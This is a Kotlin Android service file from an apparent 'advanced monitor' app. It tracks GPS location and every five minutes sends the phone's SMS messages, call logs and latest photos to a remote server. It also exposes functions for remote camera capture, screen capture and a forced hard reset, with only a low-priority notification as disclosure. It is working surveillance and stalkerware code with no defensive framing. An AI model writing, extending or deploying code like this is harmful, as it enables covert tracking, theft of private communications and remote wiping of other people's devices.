package com.example.advancedmonitor.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.advancedmonitor.R
import com.example.advancedmonitor.utils.ApiClient
import com.example.advancedmonitor.utils.DeviceUtils
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.Executors

class MonitoringService : Service(), LocationListener {

    private val binder = LocalBinder()
    private lateinit var locationManager: LocationManager
    private var timer: Timer? = null
    private var lastLocation: Location? = null
    private val executor = Executors.newSingleThreadExecutor()

    inner class LocalBinder : Binder() {
        fun getService(): MonitoringService = this@MonitoringService
    }

    override fun onBind(intent: Intent?): IBinder? = binder

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
        startLocationUpdates()
        startDataCollection()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "monitoring_channel",
                "Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "monitoring_channel")
            .setContentTitle("Monitoring Active")
            .setContentText("Collecting device data")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun startLocationUpdates() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                5000,
                10f,
                this
            )
        } catch (e: SecurityException) {
            Log.e("MonitoringService", "Location permission not granted", e)
        }
    }

    private fun startDataCollection() {
        timer = Timer()
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                collectAndSendData()
            }
        }, 0, 300000) // 5 minutes
    }

    private fun collectAndSendData() {
        executor.execute {
            try {
                val location = lastLocation?.let {
                    mapOf(
                        "lat" to it.latitude,
                        "lng" to it.longitude,
                        "time" to it.time
                    )
                }
                
                val sms = DeviceUtils.getSMS(applicationContext)
                val calls = DeviceUtils.getCallLogs(applicationContext)
                val photos = DeviceUtils.getLatestPhotos(applicationContext, 5)
                
                ApiClient.sendData(applicationContext, location, sms, calls, photos)
            } catch (e: Exception) {
                Log.e("MonitoringService", "Data collection error: ${e.message}")
            }
        }
    }

    fun captureCamera(cameraType: String) {
        val intent = Intent(applicationContext, CameraService::class.java).apply {
            putExtra("camera_type", cameraType)
        }
        startService(intent)
    }

    fun startScreenCapture() {
        val intent = Intent(applicationContext, ScreenCaptureService::class.java)
        startService(intent)
    }

    fun forceHardReset() {
        DeviceUtils.forceHardReset(applicationContext)
    }

    override fun onLocationChanged(location: Location) {
        lastLocation = location
    }

    override fun onDestroy() {
        super.onDestroy()
        locationManager.removeUpdates(this)
        timer?.cancel()
        executor.shutdown()
    }
}
